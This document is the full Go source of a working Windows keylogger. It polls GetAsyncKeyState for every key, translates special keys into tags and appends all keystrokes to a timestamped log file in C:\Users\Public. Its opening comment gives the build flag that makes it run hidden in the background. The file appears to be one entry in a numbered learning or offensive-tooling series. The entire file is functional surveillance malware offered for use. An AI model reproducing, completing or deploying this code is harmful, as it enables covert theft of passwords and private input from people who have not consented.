// Simple key logger using GetAsyncKeyState which outputs key presses to a log file under C:\Users\Public\
// it will run in the background if compiled with: go build -ldflags -H=windowsgui .\02-keylogger.go
package main

import (
	"fmt"
	"syscall"
	"log"
	"time"
	"os"
)

func testSpecial(keyPress int) string {
	// handling some special characters per https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	switch keyPress {
	case 0x0A, 0x0B, 0x0E, 0x0F, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1C, 0x1D, 0x1E, 0x1F, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x5E, 0x6C, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0X80, 0X81, 0X82, 0X83, 0X84, 0X85, 0X86, 0X87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA:
		// ignoring some special characters that shouldn't impact input
		return ""
	case 0x0C:
		return "[CLEAR]"
	case 0x0D:
		return "\n"
	case 0x10, 0xA0, 0xA1:
		return "[SHIFT]"
	case 0x11, 0xA2, 0xA3:
		return "[CTRL]"
	case 0x12, 0xA4, 0xA5:
		return "[ALT]"
	case 0x13:
		return "[PAUSE]"
	case 0x14:
		return "[CAPS]"
	case 0x1B:
		return "[ESC]"
	case 0x21:
		return "[PGUP]"
	case 0x22:
		return "[PGDWN]"
	case 0x23:
		return "[END]"
	case 0x24:
		return "[HOME]"
	case 0x25:
		return "[LFTARR]"
	case 0x26:
		return "[UPARR]"
	case 0x27:
		return "[RGTARR]"
	case 0x28:
		return "[DWNARR]"
	case 0x29:
		return "[SELECT]"
	case 0x2A:
		return "[PRNT]"
	case 0x2B:
		return "[EXEC]"
	case 0x2C:
		return "[PRNTSCR]"
	case 0x2D:
		return "[INS]"
	case 0x2E:
		return "[DEL]"
	case 0x2F:
		return "[HELP]"
	case 0x5B, 0x5C:
		return "[WIN]"
	case 0x5D:
		return "[APPS]"
	case 0x5F:
		return "[SLEEP]"
	case 0x60:
		return "0"
	case 0x61:
		return "1"
	case 0x62:
		return "2"
	case 0x63:
		return "3"
	case 0x64:
		return "4"
	case 0x65:
		return "5"
	case 0x66:
		return "6"
	case 0x67:
		return "7"
	case 0x68:
		return "8"
	case 0x69:
		return "9"
	case 0x6A:
		return "*"
	case 0x6B, 0xBB:
		return "+"
	case 0x6D, 0xBD:
		return "-"
	case 0x6E, 0xBE:
		return "."
	case 0x6F, 0xBF:
		return "/"
	case 0x90:
		return "[NUMLOCK]"
	case 0x91:
		return "[SCRLLOCK]"
	case 0xBA:
		return ";"
	case 0xBC:
		return ","
	case 0xC0:
		return "`"
	case 0xDB:
		return "["
	case 0xDC:
		return "\\"
	case 0xDD:
		return "]"
	case 0xDE:
		return "'"
	default:
		return "False"
	}
}

// following https://github.com/EgeBalci/Keylogger/blob/master/Source.cpp for some of the main functionality
func main(){
	// using GetAsyncKeyState from user32
	var user32 = syscall.NewLazyDLL("user32.dll")
	var ProcGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

	// setting up blocked variable if input can't be read due to access issues and creating the log file to be written to
	blocked := 0
	filename := fmt.Sprintf("C:\\Users\\Public\\%d-log.txt",time.Now().Unix())
	file,err := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	// looping infinitely and checking user input through GetAsyncKeyState
	for true{	
		// ignoring mouse input and some additional special characters for the moment, looping to check key state
		for key := 0x08; key <= 0xDE; key++ {
			// calling GetAsyncKeyState and taking output as int16 (short) to check
			keyRet,_,err := ProcGetAsyncKeyState.Call(uintptr(key))
			newKey := int16(keyRet)
			if err.Error() != "The operation completed successfully." {
				if err.Error() == "Access is denied." {
					if blocked != 1 {
						// logging if input was missed due to access issues
						_,err := file.WriteString("\n! Input missed, process is above the loggers privilege\n")
						if err != nil {
							log.Fatalln(err)
						}
						blocked = 1
					}
				} else {
					log.Fatalln(err)
				}
			}

			// if least and most significant bits are set (https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate#return-value), 
			// then check if it's a special character and log the users key presses
			if newKey == -32767 { 
				testKey := testSpecial(key)
				if testKey == "False" {
					character := fmt.Sprintf("%c",key)
					_,err := file.WriteString(character)
					if err != nil {
						log.Fatalln(err)
					}
				} else {
					_,err := file.WriteString(testKey)
					if err != nil {
						log.Fatalln(err)
					}
				}
				blocked = 0 // resetting blocked if user input was received
			}
		}
	}
}